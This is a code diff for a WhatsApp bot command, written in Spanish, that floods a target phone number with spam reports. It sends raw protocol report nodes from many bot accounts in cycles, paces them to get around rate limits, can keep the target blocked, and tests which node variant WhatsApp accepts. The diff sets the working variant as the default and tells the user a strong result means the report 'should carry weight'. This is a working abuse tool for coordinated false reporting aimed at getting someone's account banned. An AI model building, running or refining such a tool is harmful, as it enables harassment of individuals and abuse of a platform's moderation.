@@ -60,7 +60,6 @@ function collectSockets(main) {
 
 const wait = ms => new Promise(r => setTimeout(r, ms));
 
-// 5 variantes del nodo de reporte para probar cuál responde WhatsApp
 function variantesNodo(jid, type) {
     return [
         { nombre: 'set+flow', nodo: { tag: 'iq', attrs: { to: 's.whatsapp.net', type: 'set', xmlns: 'spam' }, content: [{ tag: 'spam_list', attrs: { jid, spam_flow: type }, content: [] }] } },
@@ -89,9 +88,9 @@ async function probarVariantes(sock, jid, type) {
     return resultados;
 }
 
-async function enviarConVariante(sock, jid, type, varianteIdx = 0) {
+async function enviarConVariante(sock, jid, type, varianteIdx = 1) {
     const variantes = variantesNodo(jid, type);
-    const nodo = variantes[varianteIdx]?.nodo || variantes[0].nodo;
+    const nodo = variantes[varianteIdx]?.nodo || variantes[1].nodo;
     try {
         await sock.query(nodo, 10000);
         return { ok: true, variante: variantes[varianteIdx].nombre };
@@ -175,9 +174,8 @@ export default {
 
         const jid = `${target}@s.whatsapp.net`;
         const type = parseType(args.find(a => a.startsWith('--tipo='))?.split('=')[1]);
-        const varianteIdx = getNum('variante', 0);
+        const varianteIdx = getNum('variante', 1);
 
-        // MODO TEST: prueba las 7 variantes del nodo
         if (esTest) {
             await responder.texto(`🔬 Probando 7 variantes contra +${target}...`);
             const resultados = await probarVariantes(sock, jid, type);
@@ -188,7 +186,7 @@ export default {
                 if (r.data) out += ` · ${r.data}`;
                 out += '\n';
             }
-            out += '\n📋 Mándame la captura. La variante que diga ✅ es la que funciona.\nLuego úsala con: `.alex ' + target + ' --variante=N`';
+            out += '\n📋 La variante ✅ es la que funciona. Úsala con: `.alex ' + target + ' --variante=N`';
             return responder.texto(out);
         }
 
@@ -226,7 +224,7 @@ export default {
                 `🧪 *Simulación*\n\n` +
                 `🎯 +${target}\n🏷️ Tipo: *${type}*\n` +
                 `🤖 Bots: *${sockets.length}*\n🔁 Ciclos: *${cycles}*\n` +
-                `⏱️ Gap: ${minGap} ms\n🔢 Variante nodo: ${varianteIdx}\n` +
+                `⏱️ Gap: ${minGap} ms\n🔢 Variante nodo: ${varianteIdx} (set-sin-flow)\n` +
                 `🔒 Bloqueo: *${keepBlocked ? 'mantenido' : 'revertido'}*`
             );
         }
@@ -236,7 +234,7 @@ export default {
             `🎯 +${target}\n🏷️ ${type}\n` +
             `🤖 ${sockets.length} bots · ${concurrency} simultáneas\n` +
             `🔁 ${cycles} ciclos/bot · gap ${minGap}ms\n` +
-            `🔢 Variante nodo: *${varianteIdx}*\n` +
+            `🔢 Variante: *${varianteIdx}* (set-sin-flow)\n` +
             `🔒 Bloqueo: ${keepBlocked ? 'mantenido' : 'revertido'}\n\n` +
             `_Estimado: ${Math.ceil((sockets.length * cycles * minGap) / concurrency / 1000)}s_`
         );
@@ -259,9 +257,8 @@ export default {
         ];
 
         if (stats.rateLimited > 0) lines.push(`🐢 Rate-limits: ${stats.rateLimited}`);
-        if (ratio === 0) lines.push('', '💡 *Solución:* Usa `.alex test ' + target + '` para encontrar qué variante responde.');
-        else if (ratio >= 80) lines.push('', '_Señal sólida._');
-        else if (ratio < 40) lines.push('', '_Señal débil. Repite con `--gap=2500 --ciclos=1` en 20-30 min._');
+        if (ratio >= 80) lines.push('', '_✅ Señal sólida: el reporte debería pesar._');
+        else if (ratio < 40) lines.push('', '_⚠️ Señal débil. Repite con `--gap=2500 --ciclos=1` en 20-30 min._');
 
         return responder.texto(lines.join('\n'));
     }
